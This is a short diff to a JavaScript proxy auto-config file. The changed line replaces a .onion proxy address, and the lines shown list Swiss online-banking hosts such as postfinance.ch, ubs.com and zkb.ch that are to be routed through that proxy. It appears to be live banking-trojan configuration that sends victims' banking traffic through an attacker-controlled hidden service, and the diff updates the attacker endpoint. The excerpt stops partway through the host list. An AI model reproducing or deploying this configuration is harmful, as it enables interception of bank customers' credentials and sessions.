@@ -1,5 +1,5 @@
 function FindProxyForURL(url, host) {
-    var proxy = "PROXY aztqlm4tslmpgkau.onion:5588;";
+    var proxy = "PROXY dwylpqieagmgtyjl.onion:5588;";
     var hosts = new Array('*.postfinance.ch', 'cs.directnet.com', '*akb.ch',
         '*ubs.com', 'tb.raiffeisendirect.ch', '*bkb.ch', '*lukb.ch',
         '*zkb.ch', '*onba.ch', '*gkb.ch', '*bekb.ch', '*zugerkb.ch',
